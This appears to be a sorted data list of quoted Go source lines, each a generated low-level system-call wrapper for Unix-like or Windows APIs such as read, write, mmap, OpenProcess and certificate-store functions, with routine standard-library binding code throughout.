"r0, _, e1 := Syscall(SYS_OPEN, uintptr(unsafe.Pointer(_p0)), uintptr(mode), uintptr(perm))"
"r0, _, e1 := Syscall(SYS_OPEN_BY_HANDLE_AT, uintptr(mountFD), uintptr(unsafe.Pointer(fh)), uintptr(flags))"
"r0, _, e1 := Syscall(SYS_OPEN_TREE, uintptr(dfd), uintptr(unsafe.Pointer(_p0)), uintptr(flags))"
"r0, _, e1 := Syscall(SYS_PATHCONF, uintptr(unsafe.Pointer(_p0)), uintptr(name), 0)"
"r0, _, e1 := Syscall(SYS_PIDFD_GETFD, uintptr(pidfd), uintptr(targetfd), uintptr(flags))"
"r0, _, e1 := Syscall(SYS_PIDFD_OPEN, uintptr(pid), uintptr(flags), 0)"
"r0, _, e1 := Syscall(SYS_PIPE, uintptr(unsafe.Pointer(p)), 0, 0)"
"r0, _, e1 := Syscall(SYS_POLL, uintptr(unsafe.Pointer(fds)), uintptr(nfds), uintptr(timeout))"
"r0, _, e1 := Syscall(SYS_READ, uintptr(fd), uintptr(_p0), uintptr(len(p)))"
"r0, _, e1 := Syscall(SYS_READ, uintptr(fd), uintptr(unsafe.Pointer(buf)), uintptr(nbuf))"
"r0, _, e1 := Syscall(SYS_READ, uintptr(fd), uintptr(unsafe.Pointer(p)), uintptr(np))"
"r0, _, e1 := Syscall(SYS_READLINK, uintptr(unsafe.Pointer(_p0)), uintptr(_p1), uintptr(len(buf)))"
"r0, _, e1 := Syscall(SYS_READV, uintptr(fd), uintptr(_p0), uintptr(len(iovs)))"
"r0, _, e1 := Syscall(SYS_RECVMSG, uintptr(s), uintptr(unsafe.Pointer(msg)), uintptr(flags))"
"r0, _, e1 := Syscall(SYS_REMOVE, uintptr(unsafe.Pointer(_p0)), 0, 0)"
"r0, _, e1 := Syscall(SYS_SENDMSG, uintptr(s), uintptr(unsafe.Pointer(msg)), uintptr(flags))"
"r0, _, e1 := Syscall(SYS_SETFSGID, uintptr(gid), 0, 0)"
"r0, _, e1 := Syscall(SYS_SETFSGID32, uintptr(gid), 0, 0)"
"r0, _, e1 := Syscall(SYS_SETFSUID, uintptr(uid), 0, 0)"
"r0, _, e1 := Syscall(SYS_SETFSUID32, uintptr(uid), 0, 0)"
"r0, _, e1 := Syscall(SYS_SHMAT, uintptr(id), uintptr(addr), uintptr(flag))"
"r0, _, e1 := Syscall(SYS_SHMCTL, uintptr(id), uintptr(cmd), uintptr(unsafe.Pointer(buf)))"
"r0, _, e1 := Syscall(SYS_SHMGET, uintptr(key), uintptr(size), uintptr(flag))"
"r0, _, e1 := Syscall(SYS_STAT, uintptr(unsafe.Pointer(_p0)), uintptr(_p1), uintptr(len(edir)))"
"r0, _, e1 := Syscall(SYS_SYSLOG, uintptr(typ), uintptr(_p0), uintptr(len(buf)))"
"r0, _, e1 := Syscall(SYS_WRITE, uintptr(fd), uintptr(_p0), uintptr(len(p)))"
"r0, _, e1 := Syscall(SYS_WRITE, uintptr(fd), uintptr(unsafe.Pointer(buf)), uintptr(nbuf))"
"r0, _, e1 := Syscall(SYS_WRITE, uintptr(fd), uintptr(unsafe.Pointer(p)), uintptr(np))"
"r0, _, e1 := Syscall(SYS_WRITEV, uintptr(fd), uintptr(_p0), uintptr(len(iovs)))"
"r0, _, e1 := Syscall(SYS_WSTAT, uintptr(unsafe.Pointer(_p0)), uintptr(_p1), uintptr(len(edir)))"
"r0, _, e1 := Syscall(SYS___GETCWD, uintptr(_p0), uintptr(len(buf)), 0)"
"r0, _, e1 := Syscall(sysno, uintptr(_p0), bufsize, uintptr(flags))"
"r0, _, e1 := Syscall6(SYS_ACCEPT4, uintptr(fd), uintptr(unsafe.Pointer(rsa)), uintptr(unsafe.Pointer(addrlen)), uintptr(flags), 0, 0)"
"r0, _, e1 := Syscall6(SYS_ACCEPT4, uintptr(s), uintptr(unsafe.Pointer(rsa)), uintptr(unsafe.Pointer(addrlen)), uintptr(flags), 0, 0)"
"r0, _, e1 := Syscall6(SYS_ADD_KEY, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(_p1)), uintptr(_p2), uintptr(len(payload)), uintptr(ringid), 0)"
"r0, _, e1 := Syscall6(SYS_COPY_FILE_RANGE, uintptr(rfd), uintptr(unsafe.Pointer(roff)), uintptr(wfd), uintptr(unsafe.Pointer(woff)), uintptr(len), uintptr(flags))"
"r0, _, e1 := Syscall6(SYS_EPOLL_PWAIT, uintptr(epfd), uintptr(_p0), uintptr(len(events)), uintptr(msec), 0, 0)"
"r0, _, e1 := Syscall6(SYS_EPOLL_WAIT, uintptr(epfd), uintptr(_p0), uintptr(len(events)), uintptr(msec), 0, 0)"
"r0, _, e1 := Syscall6(SYS_EXTATTR_GET_FD, uintptr(fd), uintptr(attrnamespace), uintptr(unsafe.Pointer(_p0)), uintptr(data), uintptr(nbytes), 0)"
"r0, _, e1 := Syscall6(SYS_EXTATTR_GET_FILE, uintptr(unsafe.Pointer(_p0)), uintptr(attrnamespace), uintptr(unsafe.Pointer(_p1)), uintptr(data), uintptr(nbytes), 0)"
"r0, _, e1 := Syscall6(SYS_EXTATTR_GET_LINK, uintptr(unsafe.Pointer(_p0)), uintptr(attrnamespace), uintptr(unsafe.Pointer(_p1)), uintptr(data), uintptr(nbytes), 0)"
"r0, _, e1 := Syscall6(SYS_EXTATTR_LIST_FD, uintptr(fd), uintptr(attrnamespace), uintptr(data), uintptr(nbytes), 0, 0)"
"r0, _, e1 := Syscall6(SYS_EXTATTR_LIST_FILE, uintptr(unsafe.Pointer(_p0)), uintptr(attrnamespace), uintptr(data), uintptr(nbytes), 0, 0)"
"r0, _, e1 := Syscall6(SYS_EXTATTR_LIST_LINK, uintptr(unsafe.Pointer(_p0)), uintptr(attrnamespace), uintptr(data), uintptr(nbytes), 0, 0)"
"r0, _, e1 := Syscall6(SYS_EXTATTR_SET_FD, uintptr(fd), uintptr(attrnamespace), uintptr(unsafe.Pointer(_p0)), uintptr(data), uintptr(nbytes), 0)"
"r0, _, e1 := Syscall6(SYS_EXTATTR_SET_FILE, uintptr(unsafe.Pointer(_p0)), uintptr(attrnamespace), uintptr(unsafe.Pointer(_p1)), uintptr(data), uintptr(nbytes), 0)"
"r0, _, e1 := Syscall6(SYS_EXTATTR_SET_LINK, uintptr(unsafe.Pointer(_p0)), uintptr(attrnamespace), uintptr(unsafe.Pointer(_p1)), uintptr(data), uintptr(nbytes), 0)"
"r0, _, e1 := Syscall6(SYS_EXTPREAD, uintptr(fd), uintptr(_p0), uintptr(len(p)), uintptr(flags), uintptr(offset), 0)"
"r0, _, e1 := Syscall6(SYS_EXTPWRITE, uintptr(fd), uintptr(_p0), uintptr(len(p)), uintptr(flags), uintptr(offset), 0)"
"r0, _, e1 := Syscall6(SYS_FGETXATTR, uintptr(fd), uintptr(unsafe.Pointer(_p0)), uintptr(_p1), uintptr(len(dest)), 0, 0)"
"r0, _, e1 := Syscall6(SYS_GETDIRENTRIES, uintptr(fd), uintptr(_p0), uintptr(len(buf)), uintptr(unsafe.Pointer(basep)), 0, 0)"
"r0, _, e1 := Syscall6(SYS_GETDIRENTRIES_FREEBSD12, uintptr(fd), uintptr(_p0), uintptr(len(buf)), uintptr(unsafe.Pointer(basep)), 0, 0)"
"r0, _, e1 := Syscall6(SYS_GETXATTR, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(_p1)), uintptr(_p2), uintptr(len(dest)), 0, 0)"
"r0, _, e1 := Syscall6(SYS_KEVENT, uintptr(kq), uintptr(change), uintptr(nchange), uintptr(event), uintptr(nevent), uintptr(unsafe.Pointer(timeout)))"
"r0, _, e1 := Syscall6(SYS_KEYCTL, uintptr(cmd), uintptr(arg2), uintptr(_p0), uintptr(len(buf)), uintptr(arg5), 0)"
"r0, _, e1 := Syscall6(SYS_KEYCTL, uintptr(cmd), uintptr(arg2), uintptr(arg3), uintptr(arg4), uintptr(arg5), 0)"
"r0, _, e1 := Syscall6(SYS_KEYCTL, uintptr(cmd), uintptr(arg2), uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(_p1)), uintptr(arg5), 0)"
"r0, _, e1 := Syscall6(SYS_KEYCTL, uintptr(cmd), uintptr(unsafe.Pointer(arg2)), uintptr(_p0), uintptr(len(buf)), 0, 0)"
"r0, _, e1 := Syscall6(SYS_LGETXATTR, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(_p1)), uintptr(_p2), uintptr(len(dest)), 0, 0)"
"r0, _, e1 := Syscall6(SYS_LSEEK, uintptr(fd), 0, uintptr(offset), uintptr(whence), 0, 0)"
"r0, _, e1 := Syscall6(SYS_MMAP, uintptr(addr), uintptr(length), uintptr(prot), uintptr(flag), uintptr(fd), uintptr(pos))"
"r0, _, e1 := Syscall6(SYS_MMAP, uintptr(addr), uintptr(length), uintptr(prot), uintptr(flags), uintptr(fd), uintptr(offset))"
"r0, _, e1 := Syscall6(SYS_MMAP2, uintptr(addr), uintptr(length), uintptr(prot), uintptr(flags), uintptr(fd), uintptr(pageOffset))"
"r0, _, e1 := Syscall6(SYS_MOUNT, uintptr(fd), uintptr(afd), uintptr(unsafe.Pointer(_p0)), uintptr(flag), uintptr(unsafe.Pointer(_p1)), 0)"
"r0, _, e1 := Syscall6(SYS_OPENAT, uintptr(dirfd), uintptr(unsafe.Pointer(_p0)), uintptr(flags), uintptr(mode), 0, 0)"
"r0, _, e1 := Syscall6(SYS_OPENAT, uintptr(dirfd), uintptr(unsafe.Pointer(_p0)), uintptr(mode), uintptr(perm), 0, 0)"
"r0, _, e1 := Syscall6(SYS_OPENAT, uintptr(fdat), uintptr(unsafe.Pointer(_p0)), uintptr(mode), uintptr(perm), 0, 0)"
"r0, _, e1 := Syscall6(SYS_OPENAT2, uintptr(dirfd), uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(open_how)), uintptr(size), 0, 0)"
"r0, _, e1 := Syscall6(SYS_PERF_EVENT_OPEN, uintptr(unsafe.Pointer(attr)), uintptr(pid), uintptr(cpu), uintptr(groupFd), uintptr(flags), 0)"
"r0, _, e1 := Syscall6(SYS_PPOLL, uintptr(unsafe.Pointer(fds)), uintptr(nfds), uintptr(unsafe.Pointer(timeout)), uintptr(unsafe.Pointer(sigmask)), 0, 0)"
"r0, _, e1 := Syscall6(SYS_PREAD, uintptr(fd), uintptr(_p0), uintptr(len(p)), 0, uintptr(offset), 0)"
"r0, _, e1 := Syscall6(SYS_PREAD, uintptr(fd), uintptr(_p0), uintptr(len(p)), 0, uintptr(offset), uintptr(offset>>32))"
"r0, _, e1 := Syscall6(SYS_PREAD, uintptr(fd), uintptr(_p0), uintptr(len(p)), uintptr(offset), 0, 0)"
"r0, _, e1 := Syscall6(SYS_PREAD, uintptr(fd), uintptr(_p0), uintptr(len(p)), uintptr(offset), uintptr(offset>>32), 0)"
"r0, _, e1 := Syscall6(SYS_PREAD64, uintptr(fd), uintptr(_p0), uintptr(len(p)), 0, uintptr(offset), uintptr(offset>>32))"
"r0, _, e1 := Syscall6(SYS_PREAD64, uintptr(fd), uintptr(_p0), uintptr(len(p)), 0, uintptr(offset>>32), uintptr(offset))"
"r0, _, e1 := Syscall6(SYS_PREAD64, uintptr(fd), uintptr(_p0), uintptr(len(p)), uintptr(offset), 0, 0)"
"r0, _, e1 := Syscall6(SYS_PREAD64, uintptr(fd), uintptr(_p0), uintptr(len(p)), uintptr(offset), uintptr(offset>>32), 0)"
"r0, _, e1 := Syscall6(SYS_PREAD64, uintptr(fd), uintptr(_p0), uintptr(len(p)), uintptr(offset>>32), uintptr(offset), 0)"
"r0, _, e1 := Syscall6(SYS_PREADV, uintptr(fd), uintptr(_p0), uintptr(len(iovs)), uintptr(offs_l), uintptr(offs_h), 0)"
"r0, _, e1 := Syscall6(SYS_PREADV2, uintptr(fd), uintptr(_p0), uintptr(len(iovs)), uintptr(offs_l), uintptr(offs_h), uintptr(flags))"
"r0, _, e1 := Syscall6(SYS_PROCESS_VM_READV, uintptr(pid), uintptr(_p0), uintptr(len(localIov)), uintptr(_p1), uintptr(len(remoteIov)), uintptr(flags))"
"r0, _, e1 := Syscall6(SYS_PROCESS_VM_WRITEV, uintptr(pid), uintptr(_p0), uintptr(len(localIov)), uintptr(_p1), uintptr(len(remoteIov)), uintptr(flags))"
"r0, _, e1 := Syscall6(SYS_PSELECT6, uintptr(nfd), uintptr(unsafe.Pointer(r)), uintptr(unsafe.Pointer(w)), uintptr(unsafe.Pointer(e)), uintptr(unsafe.Pointer(timeout)), uintptr(unsafe.Pointer(sigmask)))"
"r0, _, e1 := Syscall6(SYS_PWRITE, uintptr(fd), uintptr(_p0), uintptr(len(p)), 0, uintptr(offset), 0)"
"r0, _, e1 := Syscall6(SYS_PWRITE, uintptr(fd), uintptr(_p0), uintptr(len(p)), 0, uintptr(offset), uintptr(offset>>32))"
"r0, _, e1 := Syscall6(SYS_PWRITE, uintptr(fd), uintptr(_p0), uintptr(len(p)), uintptr(offset), 0, 0)"
"r0, _, e1 := Syscall6(SYS_PWRITE, uintptr(fd), uintptr(_p0), uintptr(len(p)), uintptr(offset), uintptr(offset>>32), 0)"
"r0, _, e1 := Syscall6(SYS_PWRITE64, uintptr(fd), uintptr(_p0), uintptr(len(p)), 0, uintptr(offset), uintptr(offset>>32))"
"r0, _, e1 := Syscall6(SYS_PWRITE64, uintptr(fd), uintptr(_p0), uintptr(len(p)), 0, uintptr(offset>>32), uintptr(offset))"
"r0, _, e1 := Syscall6(SYS_PWRITE64, uintptr(fd), uintptr(_p0), uintptr(len(p)), uintptr(offset), 0, 0)"
"r0, _, e1 := Syscall6(SYS_PWRITE64, uintptr(fd), uintptr(_p0), uintptr(len(p)), uintptr(offset), uintptr(offset>>32), 0)"
"r0, _, e1 := Syscall6(SYS_PWRITE64, uintptr(fd), uintptr(_p0), uintptr(len(p)), uintptr(offset>>32), uintptr(offset), 0)"
"r0, _, e1 := Syscall6(SYS_PWRITEV, uintptr(fd), uintptr(_p0), uintptr(len(iovs)), uintptr(offs_l), uintptr(offs_h), 0)"
"r0, _, e1 := Syscall6(SYS_PWRITEV2, uintptr(fd), uintptr(_p0), uintptr(len(iovs)), uintptr(offs_l), uintptr(offs_h), uintptr(flags))"
"r0, _, e1 := Syscall6(SYS_READLINKAT, uintptr(dirfd), uintptr(unsafe.Pointer(_p0)), uintptr(_p1), uintptr(len(buf)), 0, 0)"
"r0, _, e1 := Syscall6(SYS_RECVFROM, uintptr(fd), uintptr(_p0), uintptr(len(p)), uintptr(flags), uintptr(unsafe.Pointer(from)), uintptr(unsafe.Pointer(fromlen)))"
"r0, _, e1 := Syscall6(SYS_REQUEST_KEY, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(_p1)), uintptr(unsafe.Pointer(_p2)), uintptr(destRingid), 0, 0)"
"r0, _, e1 := Syscall6(SYS_SELECT, uintptr(nfd), uintptr(unsafe.Pointer(r)), uintptr(unsafe.Pointer(w)), uintptr(unsafe.Pointer(e)), uintptr(unsafe.Pointer(timeout)), 0)"
"r0, _, e1 := Syscall6(SYS_SENDFILE, uintptr(outfd), uintptr(infd), uintptr(unsafe.Pointer(offset)), uintptr(count), 0, 0)"
"r0, _, e1 := Syscall6(SYS_SENDFILE64, uintptr(outfd), uintptr(infd), uintptr(unsafe.Pointer(offset)), uintptr(count), 0, 0)"
"r0, _, e1 := Syscall6(SYS_SIGNALFD4, uintptr(fd), uintptr(unsafe.Pointer(sigmask)), uintptr(maskSize), uintptr(flags), 0, 0)"
"r0, _, e1 := Syscall6(SYS_SPLICE, uintptr(rfd), uintptr(unsafe.Pointer(roff)), uintptr(wfd), uintptr(unsafe.Pointer(woff)), uintptr(len), uintptr(flags))"
"r0, _, e1 := Syscall6(SYS_TEE, uintptr(rfd), uintptr(wfd), uintptr(len), uintptr(flags), 0, 0)"
"r0, _, e1 := Syscall6(SYS_WAIT4, uintptr(pid), uintptr(unsafe.Pointer(wstatus)), uintptr(options), uintptr(unsafe.Pointer(rusage)), 0, 0)"
"r0, _, e1 := Syscall6(SYS__NEWSELECT, uintptr(nfd), uintptr(unsafe.Pointer(r)), uintptr(unsafe.Pointer(w)), uintptr(unsafe.Pointer(e)), uintptr(unsafe.Pointer(timeout)), 0)"
"r0, _, e1 := Syscall6(_SYS_GETDIRENTRIES64, uintptr(fd), uintptr(p), uintptr(len(buf)), uintptr(unsafe.Pointer(basep)), 0, 0)"
"r0, _, e1 := Syscall9(SYS_MMAP, uintptr(addr), uintptr(length), uintptr(prot), uintptr(flag), uintptr(fd), 0, uintptr(pos), 0, 0)"
"r0, _, e1 := Syscall9(SYS_MMAP, uintptr(addr), uintptr(length), uintptr(prot), uintptr(flag), uintptr(fd), 0, uintptr(pos), uintptr(pos>>32), 0)"
"r0, _, e1 := Syscall9(SYS_MMAP, uintptr(addr), uintptr(length), uintptr(prot), uintptr(flag), uintptr(fd), uintptr(pos), uintptr(pos>>32), 0, 0)"
"r0, _, e1 := rawSysvicall6(uintptr(unsafe.Pointer("
"r0, _, e1 := syscall.Syscall(procCertCreateCertificateContext.Addr(), 3, uintptr(certEncodingType), uintptr(unsafe.Pointer(certEncoded)), uintptr(encodedLen))"
"r0, _, e1 := syscall.Syscall(procCertEnumCertificatesInStore.Addr(), 2, uintptr(store), uintptr(unsafe.Pointer(prevContext)), 0)"
"r0, _, e1 := syscall.Syscall(procCertOpenSystemStoreW.Addr(), 2, uintptr(hprov), uintptr(unsafe.Pointer(name)), 0)"
"r0, _, e1 := syscall.Syscall(procCommandLineToArgvW.Addr(), 2, uintptr(unsafe.Pointer(cmd)), uintptr(unsafe.Pointer(argc)), 0)"
"r0, _, e1 := syscall.Syscall(procCreateJobObjectW.Addr(), 2, uintptr(unsafe.Pointer(jobAttr)), uintptr(unsafe.Pointer(name)), 0)"
"r0, _, e1 := syscall.Syscall(procCreateMutexW.Addr(), 3, uintptr(unsafe.Pointer(mutexAttrs)), uintptr(_p0), uintptr(unsafe.Pointer(name)))"
"r0, _, e1 := syscall.Syscall(procCreateToolhelp32Snapshot.Addr(), 2, uintptr(flags), uintptr(processId), 0)"
"r0, _, e1 := syscall.Syscall(procExpandEnvironmentStringsW.Addr(), 3, uintptr(unsafe.Pointer(src)), uintptr(unsafe.Pointer(dst)), uintptr(size))"
"r0, _, e1 := syscall.Syscall(procFindFirstChangeNotificationW.Addr(), 3, uintptr(unsafe.Pointer(path)), uintptr(_p1), uintptr(notifyFilter))"
"r0, _, e1 := syscall.Syscall(procFindFirstFileW.Addr(), 2, uintptr(unsafe.Pointer(name)), uintptr(unsafe.Pointer(data)), 0)"
"r0, _, e1 := syscall.Syscall(procFindFirstVolumeMountPointW.Addr(), 3, uintptr(unsafe.Pointer(rootPathName)), uintptr(unsafe.Pointer(volumeMountPoint)), uintptr(bufferLength))"
"r0, _, e1 := syscall.Syscall(procFindFirstVolumeW.Addr(), 2, uintptr(unsafe.Pointer(volumeName)), uintptr(bufferLength), 0)"
"r0, _, e1 := syscall.Syscall(procFindResourceW.Addr(), 3, uintptr(module), uintptr(name), uintptr(resType))"
"r0, _, e1 := syscall.Syscall(procGetCurrentDirectoryW.Addr(), 2, uintptr(buflen), uintptr(unsafe.Pointer(buf)), 0)"
"r0, _, e1 := syscall.Syscall(procGetEnvironmentStringsW.Addr(), 0, 0, 0, 0)"
"r0, _, e1 := syscall.Syscall(procGetEnvironmentVariableW.Addr(), 3, uintptr(unsafe.Pointer(name)), uintptr(unsafe.Pointer(buffer)), uintptr(size))"
"r0, _, e1 := syscall.Syscall(procGetFileAttributesW.Addr(), 1, uintptr(unsafe.Pointer(name)), 0, 0)"
"r0, _, e1 := syscall.Syscall(procGetFileType.Addr(), 1, uintptr(filehandle), 0, 0)"
"r0, _, e1 := syscall.Syscall(procGetFileVersionInfoSizeW.Addr(), 2, uintptr(unsafe.Pointer(filename)), uintptr(unsafe.Pointer(zeroHandle)), 0)"
"r0, _, e1 := syscall.Syscall(procGetLogicalDriveStringsW.Addr(), 2, uintptr(bufferLength), uintptr(unsafe.Pointer(buffer)), 0)"
"r0, _, e1 := syscall.Syscall(procGetLogicalDrives.Addr(), 0, 0, 0, 0)"
"r0, _, e1 := syscall.Syscall(procGetLongPathNameW.Addr(), 3, uintptr(unsafe.Pointer(path)), uintptr(unsafe.Pointer(buf)), uintptr(buflen))"
"r0, _, e1 := syscall.Syscall(procGetModuleFileNameW.Addr(), 3, uintptr(module), uintptr(unsafe.Pointer(filename)), uintptr(size))"
"r0, _, e1 := syscall.Syscall(procGetPriorityClass.Addr(), 1, uintptr(process), 0, 0)"
"r0, _, e1 := syscall.Syscall(procGetProcAddress.Addr(), 2, uintptr(module), ordinal, 0)"
"r0, _, e1 := syscall.Syscall(procGetProcAddress.Addr(), 2, uintptr(module), uintptr(unsafe.Pointer(procname)), 0)"
"r0, _, e1 := syscall.Syscall(procGetProcessId.Addr(), 1, uintptr(process), 0, 0)"
"r0, _, e1 := syscall.Syscall(procGetShortPathNameW.Addr(), 3, uintptr(unsafe.Pointer(longpath)), uintptr(unsafe.Pointer(shortpath)), uintptr(buflen))"
"r0, _, e1 := syscall.Syscall(procGetStdHandle.Addr(), 1, uintptr(stdhandle), 0, 0)"
"r0, _, e1 := syscall.Syscall(procGetSystemDirectoryW.Addr(), 2, uintptr(unsafe.Pointer(dir)), uintptr(dirLen), 0)"
"r0, _, e1 := syscall.Syscall(procGetSystemWindowsDirectoryW.Addr(), 2, uintptr(unsafe.Pointer(dir)), uintptr(dirLen), 0)"
"r0, _, e1 := syscall.Syscall(procGetTempPathW.Addr(), 2, uintptr(buflen), uintptr(unsafe.Pointer(buf)), 0)"
"r0, _, e1 := syscall.Syscall(procGetTimeZoneInformation.Addr(), 1, uintptr(unsafe.Pointer(tzi)), 0, 0)"
"r0, _, e1 := syscall.Syscall(procGetVersion.Addr(), 0, 0, 0, 0)"
"r0, _, e1 := syscall.Syscall(procGetWindowThreadProcessId.Addr(), 2, uintptr(hwnd), uintptr(unsafe.Pointer(pid)), 0)"
"r0, _, e1 := syscall.Syscall(procGetWindowsDirectoryW.Addr(), 2, uintptr(unsafe.Pointer(dir)), uintptr(dirLen), 0)"
"r0, _, e1 := syscall.Syscall(procIsTokenRestricted.Addr(), 1, uintptr(tokenHandle), 0, 0)"
"r0, _, e1 := syscall.Syscall(procLoadLibraryExW.Addr(), 3, uintptr(unsafe.Pointer(libname)), uintptr(zero), uintptr(flags))"
"r0, _, e1 := syscall.Syscall(procLoadLibraryW.Addr(), 1, uintptr(unsafe.Pointer(libname)), 0, 0)"
"r0, _, e1 := syscall.Syscall(procLoadResource.Addr(), 2, uintptr(module), uintptr(resInfo), 0)"
"r0, _, e1 := syscall.Syscall(procLocalAlloc.Addr(), 2, uintptr(flags), uintptr(length), 0)"
"r0, _, e1 := syscall.Syscall(procLocalFree.Addr(), 1, uintptr(hmem), 0, 0)"
"r0, _, e1 := syscall.Syscall(procLockResource.Addr(), 1, uintptr(resData), 0, 0)"
"r0, _, e1 := syscall.Syscall(procOpenEventW.Addr(), 3, uintptr(desiredAccess), uintptr(_p0), uintptr(unsafe.Pointer(name)))"
"r0, _, e1 := syscall.Syscall(procOpenMutexW.Addr(), 3, uintptr(desiredAccess), uintptr(_p0), uintptr(unsafe.Pointer(name)))"
"r0, _, e1 := syscall.Syscall(procOpenProcess.Addr(), 3, uintptr(desiredAccess), uintptr(_p0), uintptr(processId))"
"r0, _, e1 := syscall.Syscall(procOpenSCManagerW.Addr(), 3, uintptr(unsafe.Pointer(machineName)), uintptr(unsafe.Pointer(databaseName)), uintptr(access))"
"r0, _, e1 := syscall.Syscall(procOpenServiceW.Addr(), 3, uintptr(mgr), uintptr(unsafe.Pointer(serviceName)), uintptr(access))"
"r0, _, e1 := syscall.Syscall(procOpenThread.Addr(), 3, uintptr(desiredAccess), uintptr(_p0), uintptr(threadId))"
"r0, _, e1 := syscall.Syscall(procPFXImportCertStore.Addr(), 3, uintptr(unsafe.Pointer(pfx)), uintptr(unsafe.Pointer(password)), uintptr(flags))"
"r0, _, e1 := syscall.Syscall(procQueryDosDeviceW.Addr(), 3, uintptr(unsafe.Pointer(deviceName)), uintptr(unsafe.Pointer(targetPath)), uintptr(max))"
"r0, _, e1 := syscall.Syscall(procRegisterEventSourceW.Addr(), 2, uintptr(unsafe.Pointer(uncServerName)), uintptr(unsafe.Pointer(sourceName)), 0)"
"r0, _, e1 := syscall.Syscall(procRegisterServiceCtrlHandlerExW.Addr(), 3, uintptr(unsafe.Pointer(serviceName)), uintptr(handlerProc), uintptr(context))"
"r0, _, e1 := syscall.Syscall(procResumeThread.Addr(), 1, uintptr(thread), 0, 0)"
"r0, _, e1 := syscall.Syscall(procSizeofResource.Addr(), 2, uintptr(module), uintptr(resInfo), 0)"
"r0, _, e1 := syscall.Syscall(procWSAEnumProtocolsW.Addr(), 3, uintptr(unsafe.Pointer(protocols)), uintptr(unsafe.Pointer(protocolBuffer)), uintptr(unsafe.Pointer(bufferLength)))"
"r0, _, e1 := syscall.Syscall(procWaitForSingleObject.Addr(), 2, uintptr(handle), uintptr(waitMilliseconds), 0)"
"r0, _, e1 := syscall.Syscall(procgethostbyname.Addr(), 1, uintptr(unsafe.Pointer(name)), 0, 0)"
"r0, _, e1 := syscall.Syscall(procgetprotobyname.Addr(), 1, uintptr(unsafe.Pointer(name)), 0, 0)"
"r0, _, e1 := syscall.Syscall(procgetservbyname.Addr(), 2, uintptr(unsafe.Pointer(name)), uintptr(unsafe.Pointer(proto)), 0)"
"r0, _, e1 := syscall.Syscall(procsocket.Addr(), 3, uintptr(af), uintptr(typ), uintptr(protocol))"
"r0, _, e1 := syscall.Syscall(syscall.SYS_POSIX_OPENPT, uintptr(oflag), 0, 0)"
"r0, _, e1 := syscall.Syscall15(procCreateServiceW.Addr(), 13, uintptr(mgr), uintptr(unsafe.Pointer(serviceName)), uintptr(unsafe.Pointer(displayName)), uintptr(access), uintptr(srvType), uintptr(startType), uintptr(errCtl), uintptr(unsafe.Pointer(pathName)), uintptr(unsafe.Pointer(loadOrderGroup)), uintptr(unsafe.Pointer(tagId)), uintptr(unsafe.Pointer(dependencies)), uintptr(unsafe.Pointer(serviceStartName)), uintptr(unsafe.Pointer(password)), 0, 0)"
"r0, _, e1 := syscall.Syscall6(procCertFindCertificateInStore.Addr(), 6, uintptr(store), uintptr(certEncodingType), uintptr(findFlags), uintptr(findType), uintptr(findPara), uintptr(unsafe.Pointer(prevCertContext)))"
"r0, _, e1 := syscall.Syscall6(procCertFindChainInStore.Addr(), 6, uintptr(store), uintptr(certEncodingType), uintptr(findFlags), uintptr(findType), uintptr(findPara), uintptr(unsafe.Pointer(prevChainContext)))"
"r0, _, e1 := syscall.Syscall6(procCertOpenStore.Addr(), 5, uintptr(storeProvider), uintptr(msgAndCertEncodingType), uintptr(cryptProv), uintptr(flags), uintptr(para), 0)"
"r0, _, e1 := syscall.Syscall6(procCreateEventExW.Addr(), 4, uintptr(unsafe.Pointer(eventAttrs)), uintptr(unsafe.Pointer(name)), uintptr(flags), uintptr(desiredAccess), 0, 0)"
"r0, _, e1 := syscall.Syscall6(procCreateEventW.Addr(), 4, uintptr(unsafe.Pointer(eventAttrs)), uintptr(manualReset), uintptr(initialState), uintptr(unsafe.Pointer(name)), 0, 0)"
"r0, _, e1 := syscall.Syscall6(procCreateFileMappingW.Addr(), 6, uintptr(fhandle), uintptr(unsafe.Pointer(sa)), uintptr(prot), uintptr(maxSizeHigh), uintptr(maxSizeLow), uintptr(unsafe.Pointer(name)))"
"r0, _, e1 := syscall.Syscall6(procCreateIoCompletionPort.Addr(), 4, uintptr(filehandle), uintptr(cphandle), uintptr(key), uintptr(threadcnt), 0, 0)"
"r0, _, e1 := syscall.Syscall6(procCreateMutexExW.Addr(), 4, uintptr(unsafe.Pointer(mutexAttrs)), uintptr(unsafe.Pointer(name)), uintptr(flags), uintptr(desiredAccess), 0, 0)"
"r0, _, e1 := syscall.Syscall6(procGetFinalPathNameByHandleW.Addr(), 4, uintptr(file), uintptr(unsafe.Pointer(filePath)), uintptr(filePathSize), uintptr(flags), 0, 0)"
"r0, _, e1 := syscall.Syscall6(procGetFullPathNameW.Addr(), 4, uintptr(unsafe.Pointer(path)), uintptr(buflen), uintptr(unsafe.Pointer(buf)), uintptr(unsafe.Pointer(fname)), 0, 0)"
"r0, _, e1 := syscall.Syscall6(procMapViewOfFile.Addr(), 5, uintptr(handle), uintptr(access), uintptr(offsetHigh), uintptr(offsetLow), uintptr(length), 0)"
"r0, _, e1 := syscall.Syscall6(procMessageBoxW.Addr(), 4, uintptr(hwnd), uintptr(unsafe.Pointer(text)), uintptr(unsafe.Pointer(caption)), uintptr(boxtype), 0, 0)"
"r0, _, e1 := syscall.Syscall6(procMultiByteToWideChar.Addr(), 6, uintptr(codePage), uintptr(dwFlags), uintptr(unsafe.Pointer(str)), uintptr(nstr), uintptr(unsafe.Pointer(wchar)), uintptr(nwchar))"
"r0, _, e1 := syscall.Syscall6(procSetFilePointer.Addr(), 4, uintptr(handle), uintptr(lowoffset), uintptr(unsafe.Pointer(highoffsetptr)), uintptr(whence), 0, 0)"
"r0, _, e1 := syscall.Syscall6(procSetInformationJobObject.Addr(), 4, uintptr(job), uintptr(JobObjectInformationClass), uintptr(JobObjectInformation), uintptr(JobObjectInformationLength), 0, 0)"
"r0, _, e1 := syscall.Syscall6(procSetupDiCreateDeviceInfoListExW.Addr(), 4, uintptr(unsafe.Pointer(classGUID)), uintptr(hwndParent), uintptr(unsafe.Pointer(machineName)), uintptr(reserved), 0, 0)"
